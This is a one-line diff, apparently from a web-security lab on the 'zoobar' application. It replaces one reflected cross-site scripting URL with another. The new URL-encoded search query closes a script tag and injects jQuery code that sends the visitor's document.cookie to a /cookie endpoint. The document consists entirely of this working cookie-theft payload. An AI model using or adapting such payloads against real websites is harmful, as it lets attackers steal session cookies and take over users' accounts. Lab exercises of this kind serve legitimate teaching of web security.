@@ -1,1 +1,1 @@
-http://zoobar.org:5000/search?q=%22%24.get('http%3A%2F%2Fzoobar.org%3A5000%2Fcookie%3Fcookie%3D'%2BencodeURIComponent(document.cookie))
+http://zoobar.org:5000/search?q=%3C%2Fscript%3E%3Cscript%3E%24.get('http%3A%2F%2Fzoobar.org%3A5000%2Fcookie'%2C%7Bcookie%3AencodeURIComponent(document.cookie)%7D)%3C%2Fscript%3E
